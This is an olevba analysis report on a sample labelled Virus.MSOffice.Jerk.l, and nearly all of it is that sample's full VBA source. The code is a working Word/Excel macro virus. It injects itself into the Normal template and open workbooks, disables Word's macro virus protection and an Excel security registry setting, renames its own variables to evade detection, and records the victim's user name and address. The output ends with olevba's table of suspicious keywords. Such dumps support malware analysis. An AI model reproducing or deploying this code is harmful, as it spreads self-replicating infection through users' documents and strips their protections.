olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.Jerk.l-ce70a2ad08efa2c04654382ab5ea8c6b4185e61f
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSOffice.Jerk.l-ce70a2ad08efa2c04654382ab5ea8c6b4185e61f - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Version = Kerstin.P2
BEGIN
  MultiUse = -2  'True
End

Private Sub Workbook_Deactivate()

On Error Resume Next

Const One = 1, Truex = True, Falsex = False, Zero = 0

Dim OurCode, ThaClass As String
Dim CounterI, CounterJ As Integer
Dim SaveDocument As Boolean

ThaClass = "ThisWorkbook"

OurCode = Application.ThisWorkbook.VBProject.VBComponents.Item(One).CodeModule.Lines(1, Application.ThisWorkbook.VBProject.VBComponents.Item(One).CodeModule.CountOfLines)

Call InfectWord(OurCode)

For CounterI = One To Application.Workbooks.Count
  
  SaveDocument = Falsex
  
  For CounterJ = One To Application.Workbooks.Item(CounterI).VBProject.VBComponents.Count
  
    If Application.Workbooks.Item(CounterI).VBProject.VBComponents.Item(CounterJ).CodeModule.CountOfLines = Zero Then
   
      If Application.Workbooks.Item(CounterI).Path <> "" And Application.Workbooks.Item(CounterI).Saved = Truex And SaveDocument = Falsex Then SaveDocument = Truex
   
      Application.Workbooks.Item(CounterI).VBProject.VBComponents.Item(CounterJ).CodeModule.InsertLines One, OurCode
      
      If Application.Workbooks.Item(CounterI).VBProject.VBComponents.Item(CounterJ).Name = ThaClass Then
        Application.Workbooks.Item(CounterI).VBProject.VBComponents.Item(CounterJ).CodeModule.ReplaceLine One * 33, "Private Sub Workbook_Deactivate()"
      Else
        Application.Workbooks.Item(CounterI).VBProject.VBComponents.Item(CounterJ).CodeModule.ReplaceLine One * 33, "Private Sub Worksheet_Deactivate()"
      End If

    End If
    
  Next CounterJ
  
  If SaveDocument = Truex Then Application.Workbooks.Item(CounterI).Save

Next CounterI

End Sub

Private Sub Document_Close()

On Error Resume Next

Const Truex = True, Falsex = False, Zero = 0, One = 1, wdFormatDocumentx = wdFormatDocument, wdFormatTemplatex = wdFormatTemplate, DoubleDot = ":"

Dim SaveDocument, SaveNormalTemplate, DocumentInfected, NormalTemplateInfected As Boolean
Dim activedoc, normaltmp As Object
Dim ActiveDocName, OurCode As String

If Day(Now) = 17 And Month(Now) > 8 Then MsgBox "Yeah,,,," & Application.UserName & " is New...", 0, "LUCKY.IV"

Set activedoc = ActiveDocument.VBProject.VBComponents.Item(One)
Set normaltmp = NormalTemplate.VBProject.VBComponents.Item(One)

Randomize

DocumentInfected = Falsex
NormalTemplateInfected = Falsex

If activedoc.CodeModule.CountOfLines <> Zero Then DocumentInfected = Truex
If normaltmp.CodeModule.CountOfLines <> Zero Then NormalTemplateInfected = Truex

Options.VirusProtection = Falsex

If (DocumentInfected = Truex Xor NormalTemplateInfected = Truex) And (ActiveDocument.SaveFormat = wdFormatDocumentx Or ActiveDocument.SaveFormat = wdFormatTemplatex) Then
   
  If DocumentInfected = Truex Then
  
    SaveNormalTemplate = NormalTemplate.Saved
  
    OurCode = activedoc.CodeModule.Lines(One, activedoc.CodeModule.CountOfLines)
    
    Call AppendLog(OurCode)
    If Int(Rnd * 100 * One) = One * 3 Then Call PolyIt(OurCode)
    Call InfectExcel(OurCode)

    normaltmp.CodeModule.InsertLines One, OurCode
    
    If SaveNormalTemplate = Truex Then NormalTemplate.Save
    
  End If


  ActiveDocName = Mid(ActiveDocument.FullName, 2, One)
  If NormalTemplateInfected = Truex And (ActiveDocName = DoubleDot Or ActiveDocument.Saved = Falsex) Then
  
    SaveDocument = ActiveDocument.Saved
    
    OurCode = normaltmp.CodeModule.Lines(One, normaltmp.CodeModule.CountOfLines)
    
    Call InfectExcel(OurCode)
    
    activedoc.CodeModule.InsertLines One, OurCode
    
    If SaveDocument = Truex Then ActiveDocument.Save
      
  End If
  
    
End If

End Sub


Private Sub PolyIt(ByRef OurCode As String)

On Error Resume Next

Const VarCount = 48, UpperLimit = 15, LowerLimit = 5, AsciiA = 65, AsciiZ = 90, One = 1, Truex = True, Falsex = False

Dim AllVariables, VariableTmp, NewCode, Variable(One To VarCount), Variable2(One To VarCount) As String
Dim CounterI, CounterJ, CounterK As Integer
Dim Changed As Boolean

AllVariables = "OurCode VarCount Variable Variable2 NewCode CounterI CounterJ CounterK Changed PolyIt UpperLimit LowerLimit AsciiA AsciiZ One AllVariables VariableTmp SaveDocument SaveNormalTemplate DocumentInfected NormalTemplateInfected activedoc normaltmp AppendLog UserAddy Chr13 Chr10 Comment UserAddyTmp UserNameTmp TimeDate ActiveDocName Truex Falsex Zero wdFormatDocumentx wdFormatTemplatex TimeFormat DateFormat DoubleDot objExcel objWord ThaClass InfectWord InfectExcel RegKey RegOptions Set1"

Randomize

CounterJ = One
For CounterI = One To Len(AllVariables)
  If Mid(AllVariables, CounterI, One) = " " Or CounterI = Len(AllVariables) Then
    
    If CounterI = Len(AllVariables) Then VariableTmp = VariableTmp & Mid(AllVariables, CounterI, One)
    
    For CounterK = One To Int((UpperLimit - LowerLimit + One) * Rnd + LowerLimit)
      Variable2(CounterJ) = Variable2(CounterJ) & Chr(Int((AsciiZ - AsciiA + One) * Rnd + AsciiA))
    Next CounterK
    
    Variable(CounterJ) = VariableTmp
    VariableTmp = ""
    CounterJ = CounterJ + One
  Else
    VariableTmp = VariableTmp & Mid(AllVariables, CounterI, One)
  End If
Next CounterI

Changed = Falsex
For CounterI = One To Len(OurCode)

  For CounterJ = One To VarCount
  
    If Mid(OurCode, CounterI, Len(Variable(CounterJ))) = Variable(CounterJ) Then
      NewCode = NewCode & Variable2(CounterJ)
      CounterI = CounterI + Len(Variable(CounterJ)) - One
      Changed = Truex
      Exit For
    End If
    
  Next CounterJ
  
  If Changed = Falsex Then
    NewCode = NewCode & Mid(OurCode, CounterI, One)
  Else
    Changed = Falsex
  End If
  
Next CounterI

OurCode = NewCode

End Sub


Private Sub AppendLog(ByRef OurCode As String)

On Error Resume Next

Const Comment = "' ", One = 1
Const TimeFormat = "hh:mm:ss: AMPM - ", DateFormat = "dddd, d mmm yyyy"

Dim UserAddyTmp, UserAddy, UserNameTmp, TimeDate, Chr13, Chr10 As String
Dim CounterI As Integer

    Chr13 = Chr(10 * One + 3)
    UserAddy = Application.UserAddress
    TimeDate = Format(Time, TimeFormat) & Format(Date, DateFormat)
    Chr10 = Chr(One * 10)
    UserNameTmp = Application.UserName
    
    For CounterI = One To Len(UserAddy)
      If Mid(UserAddy, CounterI, One) <> Chr13 Then
        If Mid(UserAddy, CounterI, One) <> Chr10 Then
          UserAddyTmp = UserAddyTmp & Mid(UserAddy, CounterI, One)
        End If
      Else
        UserAddyTmp = UserAddyTmp & Chr13 & Comment
      End If
    Next CounterI

    OurCode = OurCode & Chr13 & Comment & TimeDate & Chr13 & Comment & UserNameTmp & Chr13 & Comment & UserAddy & Chr13
End Sub

Private Sub InfectExcel(ByVal OurCode As String)

On Error Resume Next

Dim Set1 As Long
Dim objExcel As Object
Dim RegKey, RegOptions As String

RegKey = "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel"
Set1 = &H0
RegOptions = "Options6"

System.PrivateProfileString("", RegKey, RegOptions) = Set1

Set objExcel = GetObject(, "Excel.Application")

Const One = 1, Zero = 0

Dim ThaClass As String
Dim CounterI, CounterJ As Integer

ThaClass = "ThisWorkbook"

For CounterI = One To objExcel.Application.Workbooks.Count
  
  For CounterJ = One To objExcel.Application.Workbooks.Item(CounterI).VBProject.VBComponents.Count
  
    If objExcel.Application.Workbooks.Item(CounterI).VBProject.VBComponents.Item(CounterJ).CodeModule.CountOfLines = Zero Then
    
      objExcel.Application.Workbooks.Item(CounterI).VBProject.VBComponents.Item(CounterJ).CodeModule.InsertLines One, OurCode
      
      If objExcel.Application.Workbooks.Item(CounterI).VBProject.VBComponents.Item(CounterJ).Name = ThaClass Then
        objExcel.Application.Workbooks.Item(CounterI).VBProject.VBComponents.Item(CounterJ).CodeModule.ReplaceLine 33 * One, "Private Sub Workbook_Deactivate()"
      Else
        objExcel.Application.Workbooks.Item(CounterI).VBProject.VBComponents.Item(CounterJ).CodeModule.ReplaceLine One * 33, "Private Sub Worksheet_Deactivate()"
      End If

    End If
    
  Next CounterJ
  
Next CounterI


Set objExcel = Nothing

End Sub


Private Sub InfectWord(ByVal OurCode As String)

On Error Resume Next

Const Truex = True, Falsex = False, One = 1, Zero = 0
Dim objWord As Object
Dim SaveNormalTemplate As Boolean

Set objWord = GetObject(, "Word.Application")

If objWord.NormalTemplate.VBProject.VBComponents.Item(One).CodeModule.CountOfLines = Zero Then
  SaveNormalTemplate = objWord.NormalTemplate.Saved
  objWord.Options.VirusProtection = Falsex
  objWord.NormalTemplate.VBProject.VBComponents.Item(One).CodeModule.InsertLines One, OurCode
  If SaveNormalTemplate = Truex Then objWord.NormalTemplate.Save
End If

Set objWord = Nothing

End Sub




+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

